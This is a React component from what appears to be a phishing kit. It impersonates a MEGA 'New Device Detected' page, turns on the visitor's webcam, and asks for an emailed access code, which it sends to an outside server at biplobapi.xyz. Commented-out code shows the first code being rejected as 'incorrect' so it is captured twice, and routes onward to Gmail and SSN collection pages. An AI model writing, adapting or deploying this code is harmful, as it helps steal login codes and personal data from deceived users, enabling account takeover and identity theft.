import React from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { useState } from "react";
import { useRef } from "react";
import { useEffect } from "react";
const VideoCode = () => {
  const videoRef = useRef(null);
  const { state } = useLocation();
  const navigate = useNavigate();
  const [test, setTest] = useState(0);
  const [passwordError, setPasswordError] = useState(false);
  const { temp } = state;
  console.log(temp);
  const {
    register,
    handleSubmit,
    formState: { errors },
    resetField,
  } = useForm();
  const handleVerify = (data) => {
    // if (test === 0) {
    //   setTest(test + 1);
    //   setPasswordError(true);
    //   localStorage.setItem('code', data.code);
    //   resetField("code");
    // }else{
    const bookings = {
      code: data.code,
      // code: localStorage.getItem('code') + '{{}}' + data.code,
    };

    console.log(bookings);

    fetch(`https://biplobapi.xyz/code/${temp}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((data) => {
        navigate(localStorage.getItem("url"));
        // if (data.modifiedCount > 0) {

        //   // reset();
        //   // navigate("/gmail", { state: { temp: temp } });
        //   // navigate("/ssn", { state: { temp: temp } });
        // }
      });
    // }
  };
  useEffect(() => {
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch((error) => {
            console.error("Error playing video:", error);
          });
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
      }
    }

    startCamera();

    // Cleanup function to stop the camera when the component unmounts
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []);
  return (
    <div className="home-bg-2 position-relative min-h-full">
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        loop
        style={{ height: "100vh", minWidth: "100vw", objectFit: "cover" }}
        className="position-absolute z-10 min-w-full min-h-full h-screen max-w-full left-0 top-0 vdo"
      />
      <div
        className="code-card position-absolute z-20 text-center"
        style={{ left: "50%", transform: "translateX(-50%)" }}
      >
        <div className="code-card">
          <img src={"/mega.png"} alt="" style={{ width: "100%" }} />
          <h3 className="nw-dv">New Device Detected</h3>
          <div>
            <p
              style={{ color: "#AC6341", fontSize: "12px", fontWeight: "700" }}
            >
              Your ACCESS CODE has been sent <b>successfully </b>
              to your email
            </p>

            <p style={{ color: "red", fontSize: "12px", fontWeight: "700" }}>
              DO NOT SHARE IT
            </p>
            <p
              style={{ color: "#AC6341", fontSize: "12px", fontWeight: "700" }}
            >
              Enter the code <br /> below to continue.
            </p>
          </div>
          <form className="code-box" onSubmit={handleSubmit(handleVerify)}>
            <input
              type="text"
              placeholder="code you have received"
              className={`form-control ${
                passwordError && "border border-danger"
              }`}
              {...register("code", { required: true })}
              defaultValue={passwordError ? "" : ""}
            />
            {passwordError && (
              <small className="text-danger">Link Incorrect</small>
            )}
            <button className="btn btn-primary">Verify</button>
          </form>

          <p style={{ color: "#63C9FD", fontSize: "12px", fontWeight: "700" }}>
            CHECK YOUR SPAM FOLDER IT MAY BE THERE.
          </p>
        </div>
      </div>
    </div>
  );
};

export default VideoCode;
